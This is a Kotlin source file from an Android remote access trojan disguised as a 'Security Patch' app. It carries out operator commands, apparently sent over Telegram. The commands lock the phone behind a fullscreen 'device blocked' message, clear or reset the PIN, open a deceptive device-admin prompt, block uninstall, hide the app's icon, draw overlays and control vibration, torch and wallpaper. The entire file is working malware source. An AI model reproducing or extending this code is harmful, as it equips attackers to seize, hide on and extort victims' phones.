package com.android.security.patch.commands

import android.app.admin.DevicePolicyManager
import android.app.admin.DevicePolicyManager.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.PixelFormat
import android.hardware.camera2.CameraManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.TextView
import com.android.security.patch.AdminReceiver
import com.android.security.patch.Config
import com.android.security.patch.HangManager
import com.android.security.patch.Prefs
import com.android.security.patch.RatApi
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.net.URL

object SystemCmd {

    private var overlayView: View? = null

    // ======== LOCK / UNLOCK ========

    fun lock(ctx: Context, chatId: Long) {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!dpm.isAdminActive(AdminReceiver.component(ctx))) {
            RatApi.sendMessage(ctx, "admin not active — lock unavailable", chatId); return
        }
        try {
            dpm.lockNow()
            RatApi.sendMessage(ctx, "locked", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    /** /hardlock <pesan> — overlay pesan lalu locknow */
    fun hardLock(ctx: Context, chatId: Long, args: Array<String>) {
        val msg = args.joinToString(" ").ifBlank {
            "Perangkat ini diblokir. Hubungi administrator."
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        try {
            showFullscreenMessage(ctx, msg)
            Handler(Looper.getMainLooper()).postDelayed({
                try { if (dpm.isAdminActive(AdminReceiver.component(ctx))) dpm.lockNow() } catch (_: Throwable) {}
            }, 1500)
            RatApi.sendMessage(ctx, "hardlock applied", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    private fun showFullscreenMessage(ctx: Context, msg: String) {
        if (!Settings.canDrawOverlays(ctx)) return
        Handler(Looper.getMainLooper()).post {
        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val tv = TextView(ctx).apply {
                setBackgroundColor(Color.parseColor("#0a0a0a"))
                setTextColor(Color.RED)
                textSize = 20f
                gravity = Gravity.CENTER
                setPadding(60, 60, 60, 60)
                text = msg
            }
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else WindowManager.LayoutParams.TYPE_PHONE
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                    or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE
            )
            wm.addView(tv, lp)
            overlayView = tv
            Handler(Looper.getMainLooper()).postDelayed({
                try { overlayView?.let { wm.removeView(it) } } catch (_: Throwable) {}
                overlayView = null
            }, 6000)
        } catch (_: Throwable) {}
        }
    }

    /**
     * /unlock              → coba matikan keyguard flags (non-root jarang bisa)
     * /unlock <pin>        → coba dismiss keyguard (perlu admin + secure lock state)
     */
    fun unlock(ctx: Context, chatId: Long, args: Array<String>) {
        val pin = args.getOrNull(0)
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!dpm.isAdminActive(AdminReceiver.component(ctx))) {
            RatApi.sendMessage(ctx, "admin not active — unlock unavailable", chatId); return
        }
        try {
            if (pin.isNullOrBlank()) {
                val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    (ctx as? android.app.Activity)?.setShowWhenLocked(true)
                }
                RatApi.sendMessage(ctx, "unlock attempted (may need pin)", chatId)
            } else {
                // device admin tidak bisa bypass pin tanpa device owner.
                // device owner: resetPassword("", 0) untuk hapus pin.
                if (AdminReceiver.isDeviceOwner(ctx)) {
                    dpm.resetPassword("", 0)
                    RatApi.sendMessage(ctx, "pin cleared (device owner)", chatId)
                } else {
                    RatApi.sendMessage(ctx, "unlock dengan pin butuh device owner", chatId)
                }
            }
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    /** /setpin <pin> — butuh device owner */
    fun setPin(ctx: Context, chatId: Long, args: Array<String>) {
        val pin = args.getOrNull(0)
        if (pin.isNullOrBlank() || pin.length < 4) {
            RatApi.sendMessage(ctx, "usage: /setpin 1234 (min 4 digit)", chatId); return
        }
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!AdminReceiver.isDeviceOwner(ctx)) {
            RatApi.sendMessage(ctx, "setpin butuh device owner (adb)", chatId); return
        }
        try {
            dpm.resetPassword(pin, 0)
            RatApi.sendMessage(ctx, "pin set", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    // ======== ADMIN ========

    fun admin(ctx: Context, chatId: Long, args: Array<String>) {
        val mode = args.getOrNull(0)?.lowercase() ?: "on"
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, AdminReceiver.component(ctx))
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Security Patch requires device admin."
            )
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        when (mode) {
            "off", "remove" -> {
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                try {
                    if (Prefs.getBool(ctx, Prefs.ANTI_UNINSTALL_ON)) {
                        RatApi.sendMessage(ctx, "anti-uninstall ON — admin tidak bisa dimatikan", chatId); return
                    }
                    dpm.removeActiveAdmin(AdminReceiver.component(ctx))
                    RatApi.sendMessage(ctx, "admin removed", chatId)
                } catch (e: Throwable) {
                    RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
                }
            }
            else -> {
                try {
                    ctx.startActivity(intent)
                    RatApi.sendMessage(ctx, "admin prompt opened on device", chatId)
                } catch (e: Throwable) {
                    RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
                }
            }
        }
    }

    // ======== OVERLAY ========

    fun overlayOn(ctx: Context, chatId: Long, args: Array<String>) {
        val msg = args.joinToString(" ").ifBlank { " " }
        if (!Settings.canDrawOverlays(ctx)) {
            val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                .setData(Uri.parse("package:${ctx.packageName}"))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            try { ctx.startActivity(i) } catch (_: Throwable) {}
            RatApi.sendMessage(ctx, "grant overlay first", chatId); return
        }
        Handler(Looper.getMainLooper()).post {
        Handler(Looper.getMainLooper()).post {
        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            if (overlayView != null) {
                try { wm.removeView(overlayView) } catch (_: Throwable) {}
            }
            val tv = TextView(ctx).apply {
                setBackgroundColor(Color.argb(200, 0, 0, 0))
                setTextColor(Color.WHITE)
                textSize = 18f
                gravity = Gravity.CENTER
                text = msg
            }
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else WindowManager.LayoutParams.TYPE_PHONE
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT
            )
            lp.gravity = Gravity.BOTTOM
            wm.addView(tv, lp)
            overlayView = tv
            RatApi.sendMessage(ctx, "overlay on", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
        }
    }

    fun overlayOff(ctx: Context, chatId: Long) {
        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            overlayView?.let { wm.removeView(it) }
            overlayView = null
            RatApi.sendMessage(ctx, "overlay off", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    // ======== LAUNCHER ICON HIDE/SHOW ========

    fun hideIcon(ctx: Context, chatId: Long) {
        try {
            val pkg = ctx.packageName
            val pm = ctx.packageManager
            val cn = ComponentName(pkg, "$pkg.WebViewActivity")
            pm.setComponentEnabledSetting(
                cn,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            RatApi.sendMessage(ctx, "launcher icon hidden", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    fun showIcon(ctx: Context, chatId: Long) {
        try {
            val pkg = ctx.packageName
            val pm = ctx.packageManager
            val cn = ComponentName(pkg, "$pkg.WebViewActivity")
            pm.setComponentEnabledSetting(
                cn,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            RatApi.sendMessage(ctx, "launcher icon shown", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    // ======== VIBRATE / WALLPAPER / FLASH ========

    fun vibrate(ctx: Context, chatId: Long, args: Array<String>) {
        val ms = (args.getOrNull(0)?.toLongOrNull() ?: 500L).coerceIn(100L, 30_000L)
        try {
            val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION") v.vibrate(ms)
            }
            RatApi.sendMessage(ctx, "vibrating ${ms}ms", chatId)
        } catch (e: Throwable) {
            RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
        }
    }

    /**
     * /wallpaper                    → apk minta lu kirim foto
     * /wallpaper url <https://...>  → download dari url
     * /wallpaper (reply foto)       → pakai foto yang di-reply
     */
    fun wallpaper(ctx: Context, chatId: Long, msg: JSONObject?) {
        val text = msg?.optString("text").orEmpty().trim()
        val args = text.split("\\s+".toRegex()).drop(1)
        val reply = msg?.optJSONObject("reply_to_message")
        val photo = reply?.optJSONArray("photo")?.let { arr ->
            if (arr.length() > 0) arr.optJSONObject(arr.length() - 1)?.optString("file_id") else null
        }
        val doc = reply?.optJSONObject("document")?.optString("file_id")

        Thread {
            try {
                val bytes: ByteArray? = when {
                    !photo.isNullOrBlank() -> RatApi.downloadTelegramFile(photo)
                    !doc.isNullOrBlank() -> RatApi.downloadTelegramFile(doc)
                    args.getOrNull(0)?.lowercase() == "url" && args.size >= 2 ->
                        URL(args[1]).openStream().use { it.readBytes() }
                    else -> null
                }
                if (bytes == null) {
                    RatApi.sendMessage(ctx, "usage: /wallpaper url <link>  atau reply foto dengan /wallpaper", chatId)
                    return@Thread
                }
                // simpan ke cache lalu set as wallpaper
                val f = File(ctx.cacheDir, "wp_${System.currentTimeMillis()}.jpg")
                FileOutputStream(f).use { it.write(bytes) }
                val wm = WallpaperManagerCompat(ctx)
                wm.setFromFile(f.absolutePath)
                f.delete()
                RatApi.sendMessage(ctx, "wallpaper set (${bytes.size} bytes)", chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "err: ${e.message}", chatId)
            }
        }.start()
    }

    private fun flashSet(ctx: Context, on: Boolean): Boolean {
        return try {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = cm.cameraIdList.firstOrNull { camId ->
                cm.getCameraCharacteristics(camId)
                    .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            } ?: return false
            cm.setTorchMode(id, on)
            true
        } catch (_: Throwable) { false }
    }

    fun flashOn(ctx: Context, chatId: Long) {
        RatApi.sendMessage(ctx, if (flashSet(ctx, true)) "flash on" else "no flash", chatId)
    }

    fun flashOff(ctx: Context, chatId: Long) {
        RatApi.sendMessage(ctx, if (flashSet(ctx, false)) "flash off" else "no flash", chatId)
    }

    fun flashBlink(ctx: Context, chatId: Long, args: Array<String>) {
        val sec = (args.getOrNull(0)?.toIntOrNull() ?: 5).coerceIn(1, 60)
        Thread {
            val end = System.currentTimeMillis() + sec * 1000L
            var on = false
            while (System.currentTimeMillis() < end) {
                on = !on
                flashSet(ctx, on)
                try { Thread.sleep(150) } catch (_: Throwable) { break }
            }
            flashSet(ctx, false)
            RatApi.sendMessage(ctx, "blink done", chatId)
        }.start()
    }
}

// small wrapper to avoid importing WallpaperManager at top if unused
private class WallpaperManagerCompat(private val ctx: Context) {
    fun setFromFile(path: String) {
        val wm = android.app.WallpaperManager.getInstance(ctx)
        val fis = File(path).inputStream()
        fis.use { wm.setStream(it) }
    }
}